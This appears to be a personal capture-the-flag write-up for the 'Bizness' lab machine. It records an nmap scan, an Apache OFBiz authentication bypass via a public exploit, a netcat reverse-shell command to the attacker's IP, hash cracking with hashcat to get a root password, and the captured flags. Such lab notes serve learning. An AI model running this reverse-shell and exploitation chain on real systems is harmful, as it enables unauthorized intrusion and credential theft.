@@ -1,0 +1,61 @@
+nmap :
+    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-08 16:19 EST
+Nmap scan report for 10.10.11.252
+Host is up (0.12s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
+|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
+|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
+80/tcp  open  http     nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_http-title: Did not follow redirect to https://bizness.htb/
+443/tcp open  ssl/http nginx 1.18.0
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: nginx/1.18.0
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
+| Not valid before: 2023-12-14T20:03:40
+|_Not valid after:  2328-11-10T20:03:40
+| tls-nextprotoneg: 
+|_  http/1.1
+|_http-title: Did not follow redirect to https://bizness.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 40.70 seconds
+
+after i did dirsearch and found /control/login page
+
+Discovered OFBiz ver 18.12
+
+I read it here(https://www.vicarius.io/vsociety/posts/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-49070-and-cve-2023-51467) that if i change the JavaEnabled to requirePasswordChange to =Y it will get an error but let me change the password
+ so it did work partialy 
+
+found script (https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass)
+
+using command:python3 exploit.py --url https://bizness.htb/ --cmd 'nc -e /bin/sh 10.10.16.120 4444'
+
+but before open nc -lvnp 4444 and got the reverse shell
+
+goes in the /home/ofbiz directory and get the user flag:
+    6f918eb2ff0fdd2800c75a52cbfad457
+
+there is linpeas.sh
+
+chmod +x to it and run it
+
+there is 3 users ofbiz,www-data,root
+
+in /opt/ofbiz/framework/resources/templates i found hashed credentials {SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a (admin$"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN)(e84e76aff05d25fd4120185e95975f8b75bcd54a)
+
+using hashcat -m 120 -a 0 "e84e76aff05d25fd4120185e95975f8b75bcd54a:d"
+
+password:
+    monkeybizness
+
+su root and enter the password,now im root,cd /root and get the root flag:
+    801e3928088b450701feb44e1ad66450
